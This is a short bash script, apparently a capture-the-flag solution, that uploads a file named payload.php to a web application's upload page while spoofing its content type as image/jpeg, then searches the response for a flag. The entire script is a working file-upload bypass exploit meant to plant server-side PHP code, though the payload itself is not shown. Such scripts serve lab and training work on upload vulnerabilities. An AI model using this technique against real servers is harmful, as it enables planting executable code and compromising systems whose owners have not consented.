#!/usr/bin/env bash

URL_ROOT="${URL_ROOT:-http://10.13.248.94}"
URL="$URL_ROOT/?page=upload#"
echo "Uploading, wait a sec..."
curl -X POST -H "Content-Type: multipart/form-data" \
	-F "Upload=Upload" \
	-F "MAX_FILE_SIZE=100000" \
	-F "uploaded=@payload.php;type=image/jpeg" \
	$URL 2>/dev/null | grep "flag" --color=auto

